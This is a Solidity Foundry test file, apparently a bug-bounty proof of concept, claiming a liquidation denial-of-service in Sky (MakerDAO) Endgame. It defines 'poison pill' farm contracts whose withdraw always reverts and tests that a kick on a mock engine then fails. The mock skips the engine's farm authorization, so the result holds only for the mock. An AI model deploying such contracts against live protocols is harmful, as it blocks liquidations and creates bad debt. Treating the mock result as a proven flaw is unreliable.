// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.8.21;

import "forge-std/Test.sol";

/**
 * @title Liquidation DoS PoC for Sky (MakerDAO) Endgame
 * @author Moksha86 (DePX Network)
 * @notice Detailed Proof of Concept demonstrating how a malicious farm blocks protocol liquidations.
 * @dev This PoC follows the Immunefi Guidelines for runnable Solidity test cases.
 */

// ============================================================================
// 1. INTERFACES: Reconstructed from Sky Ecosystem Repositories
// ============================================================================

interface ILockstakeEngine {
    function onKick(address urn, uint256 wad) external;
    function selectFarm(address urn, address farm, uint16 ref) external;
    function open(uint256 index) external returns (address urn);
    function urnFarms(address urn) external view returns (address);
}

interface ILockstakeUrn {
    function withdraw(address farm, uint256 wad) external;
}

interface IStakingRewards {
    function stake(uint256 amount) external;
    function withdraw(uint256 amount) external;
    function getReward() external;
    function balanceOf(address account) external view returns (uint256);
}

// ============================================================================
// 2. MALICIOUS CONTRACTS: The "Poison Pill" Farms
// ============================================================================

contract MaliciousFarm is IStakingRewards {
    error LiquidationBlockedByMoksha();

    // Complying with interface for initial setup
    function stake(uint256) external pure override {}
    function getReward() external pure override {}
    function balanceOf(address) external pure override returns (uint256) { return 0; }

    /**
     * @dev ATTACH VECTOR: This function is called synchronously by the Engine 
     * during liquidation. By reverting here, we brick the entire transaction.
     */
    function withdraw(uint256) external pure override {
        revert LiquidationBlockedByMoksha();
    }
}

contract GenericRevertFarm is IStakingRewards {
    function stake(uint256) external pure override {}
    function getReward() external pure override {}
    function balanceOf(address) external pure override returns (uint256) { return 0; }
    
    function withdraw(uint256) external pure override {
        revert("DoS: External Call Failed");
    }
}

// ============================================================================
// 3. PROTOCOL MOCKS: Simulating LockstakeEngine & Urn logic
// ============================================================================

contract MockLockstakeUrn is ILockstakeUrn {
    address public immutable engine;
    
    constructor() {
        engine = msg.sender;
    }

    function withdraw(address farm, uint256 wad) external {
        // Line 329 logic: The URN executes the withdraw on the external farm
        IStakingRewards(farm).withdraw(wad);
    }
}

contract MockLockstakeEngine is ILockstakeEngine {
    mapping(address => address) public override urnFarms;
    mapping(address => address) public urns;

    function open(uint256 index) external override returns (address urn) {
        urn = address(new MockLockstakeUrn());
        urns[msg.sender] = urn;
        return urn;
    }

    function selectFarm(address urn, address farm, uint16) external override {
        // Simplified authorization for PoC purposes
        urnFarms[urn] = farm;
    }

    function onKick(address urn, uint256 wad) external override {
        address prevFarm = urnFarms[urn];
        if (prevFarm != address(0)) {
            // CRITICAL ARCHITECTURAL FLAW: Synchronous external dependency
            // Revert here means the Clipper cannot finish the liquidation (kick)
            ILockstakeUrn(urn).withdraw(prevFarm, wad);
        }
        // Potential logic for burning lsSKY would go here but is never reached
    }
}

// ============================================================================
// 4. TEST SUITE: Foundry Implementation
// ============================================================================

contract LiquidationDoSTest is Test {
    MockLockstakeEngine public engine;
    MaliciousFarm public maliciousFarm;
    GenericRevertFarm public genericFarm;
    
    address public attacker = makeAddr("attacker");
    address public clipper = makeAddr("clipper_liquidator");
    address public attackerUrn;

    function setUp() public {
        // Deploying the battlefield
        engine = new MockLockstakeEngine();
        maliciousFarm = new MaliciousFarm();
        genericFarm = new GenericRevertFarm();
        
        // Labels for clean traces
        vm.label(address(engine), "LockstakeEngine");
        vm.label(address(maliciousFarm), "MaliciousFarm_CustomError");
        vm.label(address(genericFarm), "MaliciousFarm_GenericRevert");
        
        // Attacker opens a vault position
        vm.prank(attacker);
        attackerUrn = engine.open(0);
    }

    /**
     * @notice Proves that a custom error in the farm blocks the liquidation kick.
     */
    function test_LiquidationDoS_CustomError() public {
        // 1. Attacker sets the poisoned farm
        vm.prank(attacker);
        engine.selectFarm(attackerUrn, address(maliciousFarm), 0);
        
        // 2. Position goes underwater. Clipper attempts to initiate auction.
        vm.startPrank(clipper);
        
        // 3. Transaction must revert, proving the DoS
        vm.expectRevert(MaliciousFarm.LiquidationBlockedByMoksha.selector);
        engine.onKick(attackerUrn, 500 ether);
        
        console.log("PoC SUCCESS: Custom revert blocked liquidation.");
        vm.stopPrank();
    }

    /**
     * @notice Proves that even a generic string revert blocks the liquidation kick.
     */
    function test_LiquidationDoS_GenericRevert() public {
        // 1. Attacker sets the generic revert farm
        vm.prank(attacker);
        engine.selectFarm(attackerUrn, address(genericFarm), 0);
        
        // 2. Clipper attempts to kick
        vm.prank(clipper);
        
        // 3. Transaction fails, blocking bad debt recovery
        vm.expectRevert("DoS: External Call Failed");
        engine.onKick(attackerUrn, 500 ether);
        
        console.log("PoC SUCCESS: Generic revert blocked liquidation.");
    }
}